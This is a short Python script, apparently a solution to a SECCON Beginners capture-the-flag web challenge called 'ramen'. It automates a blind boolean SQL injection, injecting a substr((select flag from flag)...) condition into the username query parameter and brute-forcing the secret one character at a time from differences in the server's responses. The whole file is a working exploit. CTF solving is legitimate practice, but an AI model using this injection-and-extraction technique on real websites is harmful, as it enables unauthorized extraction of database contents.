import requests
import string
from time import sleep

strings = '{}_'+string.ascii_letters + string.digits

result = ''

while True:
    for c in strings:
        string = result+c
        print('request: {}'.format(string))
        res = requests.get(
            "https://ramen.quals.beginners.seccon.jp/?username=test' or substr((select flag from flag), 1, {})='{}' or 'test".format(len(result)+1, string)
        )
        if '太郎' in res.text:
            result += c
            print(result)
            break
        sleep(0.3)
